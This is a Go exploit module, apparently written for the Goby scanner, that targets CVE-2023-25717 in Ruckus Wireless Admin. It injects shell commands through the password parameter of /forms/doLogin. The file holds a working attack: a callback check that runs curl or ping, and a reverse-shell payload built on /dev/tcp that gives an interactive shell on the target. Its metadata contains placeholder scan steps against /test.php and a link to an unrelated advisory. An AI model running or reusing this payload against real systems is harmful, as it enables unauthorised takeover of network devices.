package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Ruckus Wireless Admin Command Execution Vulnerability (CVE-2023-25717)",
    "Description": "<p>Ruckus Wireless Admin is the background management system for multiple routers and hardware devices of ruckuswireless.</p><p>A command execution vulnerability exists in Ruckus Wireless Admin version 10.4 and earlier.</p>",
    "Product": "Ruckus-Wireless-Admin",
    "Homepage": "https://support.ruckuswireless.com/",
    "DisclosureDate": "2023-02-14",
    "Author": "sunying",
    "FofaQuery": "title=\"Ruckus Wireless Admin\"",
    "GobyQuery": "title=\"Ruckus Wireless Admin\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://support.ruckuswireless.com/security_bulletins/315\">https://support.ruckuswireless.com/security_bulletins/315</a></p><p><a href=\"https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf\"></a></p>",
    "References": [
        "https://cybir.com/2023/cve/proof-of-concept-ruckus-wireless-admin-10-4-unauthenticated-remote-code-execution-csrf-ssrf/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "Dnslog,shell_linux",
            "show": ""
        },
        {
            "name": "Dnslog",
            "type": "input",
            "value": "xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-25717"
    ],
    "CNNVD": [
        "CNNVD-202302-961"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Ruckus Wireless Admin 命令执行漏洞（CVE-2023-25717）",
            "Product": "Ruckus-Wireless-Admin",
            "Description": "<p>Ruckus Wireless Admin是ruckuswireless多个路由、硬件设备的后台管理系统。</p><p>Ruckus Wireless Admin在10.4 及更早版本存在命令执行漏洞。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://support.ruckuswireless.com/security_bulletins/315\">https://support.ruckuswireless.com/security_bulletins/315</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Ruckus Wireless Admin Command Execution Vulnerability (CVE-2023-25717)",
            "Product": "Ruckus-Wireless-Admin",
            "Description": "<p>Ruckus Wireless Admin is the background management system for multiple routers and hardware devices of ruckuswireless.</p><p>A command execution vulnerability exists in Ruckus Wireless Admin version 10.4 and earlier.<br><br></p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://support.ruckuswireless.com/security_bulletins/315\">https://support.ruckuswireless.com/security_bulletins/315</a></p><p><a href=\"https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf\"></a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10714"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			cmd := "curl " + checkUrl
			if isDomain {
				cmd = "ping -c 1 " + checkUrl
			}
			get_params := fmt.Sprintf("?login_username=admin&password=password$(%s)&x=0&y=0", url.QueryEscape(cmd))
			cfg := httpclient.NewGetRequestConfig("/forms/doLogin" + get_params)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			httpclient.DoHttpRequest(u, cfg)
			// 查看地址是否被请求，若 15 秒内没被请求返回 false，否则返回 true
			return godclient.PullExists(checkStr, time.Second*5)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "shell_linux" {
				waitSessionCh := make(chan string)
				//rp就是拿到的监听端口
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					//ReverseTCPByBash返回的是bash -i >& /dev/tcp/godserver/reverseport 也就是rp
					cmd := godclient.ReverseTCPByBash(rp)
					cmd = strings.Replace(cmd, "bash", "/bin/busybox sh", -1)
					get_params := fmt.Sprintf("?login_username=admin&password=password$(%s)&x=0&y=0", url.QueryEscape(cmd))
					cfg := httpclient.NewGetRequestConfig("/forms/doLogin" + get_params)
					cfg.VerifyTls = false
					cfg.FollowRedirect = false
					//发包
					httpclient.DoHttpRequest(expResult.HostInfo, cfg)
					//检测为固定格式
					select {
					case webConsleID := <-waitSessionCh:
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 10):
					}
				}
			} else {
				cmd := "ping -c 1 " + ss.Params["Dnslog"].(string)
				get_params := fmt.Sprintf("?login_username=admin&password=password$(%s)&x=0&y=0", url.QueryEscape(cmd))
				cfg := httpclient.NewGetRequestConfig("/forms/doLogin" + get_params)
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				cfg.Timeout = 10
				httpclient.DoHttpRequest(expResult.HostInfo, cfg)
				expResult.Success = true
			}
			return expResult
		},
	))
}